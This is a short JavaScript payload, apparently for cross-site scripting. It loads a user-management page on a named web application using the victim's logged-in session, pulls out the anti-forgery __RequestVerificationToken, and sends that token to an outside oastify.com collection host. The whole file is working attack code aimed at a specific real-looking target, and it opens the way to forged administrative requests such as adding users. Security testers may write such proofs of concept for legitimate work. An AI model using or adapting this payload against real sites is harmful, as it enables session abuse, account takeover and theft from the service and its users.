// main.js - Fetch token and send to your server via GET
fetch('https://inspective.leaddocket.com/manageusers/add', {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.text())
.then(html => {
    const match = html.match(/name="__RequestVerificationToken".*?value="([^"]+)"/s);
    if (match && match[1]) {
        // Send token to your server using GET with query parameter
        const token = encodeURIComponent(match[1]);
        fetch(`https://1bdrca7ssca80qfi3duplmszcqih68zwo.oastify.com/?t=${token}`);
    }
});
